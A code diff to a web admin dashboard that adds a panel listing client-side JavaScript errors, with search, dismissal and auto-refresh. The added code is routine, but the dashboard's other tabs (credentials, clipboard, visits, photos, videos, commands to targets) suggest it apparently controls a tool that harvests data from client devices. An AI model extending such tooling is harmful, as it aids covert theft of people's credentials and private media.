@@ -545,11 +545,19 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
 
 <!-- --- ERRORS --- -->
 <div class="view" id="v-errors">
-    <div style="display:flex;justify-content:flex-end;margin-bottom:8px">
-        <button class="btn danger" onclick="clearErrorLog()">Clear Error Log</button>
+    <div style="display:flex;justify-content:flex-end;margin-bottom:8px;gap:8px">
+        <button class="btn export" onclick="loadClientErrors()">↻ Refresh</button>
+        <button class="btn danger" onclick="clearErrorLog()">Clear Admin Log</button>
     </div>
     <div class="pnl">
-        <div class="pnl-h"><h2>Error Log</h2></div>
+        <div class="pnl-h" style="display:flex;align-items:center;justify-content:space-between">
+            <h2>Client JS Errors <span id="client-err-count" style="background:#d93025;color:#fff;border-radius:9px;padding:1px 7px;font-size:.7rem;font-weight:700;margin-left:6px"></span></h2>
+            <input id="err-search" type="text" placeholder="Search errors..." style="background:var(--bg2);border:1px solid var(--border2);color:var(--fg);padding:4px 10px;border-radius:6px;font-size:.78rem;width:200px" oninput="renderClientErrors()">
+        </div>
+        <div class="pnl-b np" id="client-error-log"><div class="empty">Loading...</div></div>
+    </div>
+    <div class="pnl" style="margin-top:16px">
+        <div class="pnl-h"><h2>Admin JS Errors</h2></div>
         <div class="pnl-b np" id="error-log"><div class="empty">No errors recorded</div></div>
     </div>
 </div>
@@ -837,6 +845,49 @@ function renderErrorLog() {
 }
 function clearErrorLog() { errorLog = []; updateTabBadge('errors', 0); renderErrorLog(); }
 
+// ── Client-side errors fetched from server ──
+let clientErrors = [];
+const dismissedErrorIds = new Set(JSON.parse(localStorage.getItem('dismissedErrIds') || '[]'));
+
+async function loadClientErrors() {
+    const data = await api('/api/errors?limit=200' + filterParam());
+    if (!data) return;
+    clientErrors = data;
+    renderClientErrors();
+}
+
+function renderClientErrors() {
+    const el = document.getElementById('client-error-log');
+    if (!el) return;
+    const search = (document.getElementById('err-search')?.value || '').toLowerCase();
+    const visible = clientErrors.filter(e =>
+        !dismissedErrorIds.has(e.id) &&
+        (!search || JSON.stringify(e).toLowerCase().includes(search))
+    );
+    const cnt = document.getElementById('client-err-count');
+    if (cnt) cnt.textContent = visible.length || '';
+    if (!visible.length) {
+        el.innerHTML = '<div class="empty">No client errors</div>';
+        return;
+    }
+    el.innerHTML = visible.map(e => `
+        <div class="ev-item" style="border-left:2px solid #d93025;display:flex;align-items:flex-start;gap:8px" id="ce-${escHtml(e.id)}">
+            <div style="flex:1">
+                <span class="ev-time">${fmtTime(e.timestamp)}</span>
+                <span class="ev-client" style="margin-left:6px">${escHtml(e.clientId||'')}</span>
+                <span class="ev-type" style="color:#d93025;margin-left:6px">${escHtml(e.type||'')}</span>
+                <div style="margin-top:3px;color:var(--fg);font-size:.72rem">${escHtml(e.message||'')}</div>
+            </div>
+            <button onclick="dismissClientError('${escHtml(e.id)}')" style="background:none;border:none;color:var(--dim);cursor:pointer;font-size:.9rem;padding:2px 5px;flex-shrink:0" title="Dismiss">✕</button>
+        </div>`).join('');
+}
+
+function dismissClientError(id) {
+    dismissedErrorIds.add(id);
+    try { localStorage.setItem('dismissedErrIds', JSON.stringify([...dismissedErrorIds])); } catch {}
+    renderClientErrors();
+}
+
 // tags
 async function loadTags() {
     try {
@@ -996,7 +1047,7 @@ $$('.tab').forEach(tab => {
         if (v === 'credentials') loadCredentials();
         if (v === 'commands') updateCmdTargets();
         if (v === 'settings') { loadConfig(); loadStorage(); }
-        if (v === 'errors')   renderErrorLog();
+        if (v === 'errors')   { renderErrorLog(); loadClientErrors(); }
     });
 });
 
@@ -1313,6 +1364,7 @@ async function refreshAll() {
         lastEventPollTs = Date.now();
 
         // Auto-refresh the active data tab so stale reads never persist
+        // photos and videos are heavy galleries — only refresh on tab click, not every 5s
         const at = document.querySelector('.tab.active');
         if (at) {
             const av = at.dataset.v;
@@ -1321,7 +1373,9 @@ async function refreshAll() {
             else if (av === 'clipboard') loadClipboard();
             else if (av === 'visits') loadVisits();
             else if (av === 'credentials') loadCredentials();
+            else if (av === 'errors') loadClientErrors();
             else if (av === 'settings') loadStorage();
+            // 'photos' and 'videos' are intentionally excluded — gallery refresh causes flash
         }
     } catch(e) { showError('refreshAll', e); }
 }
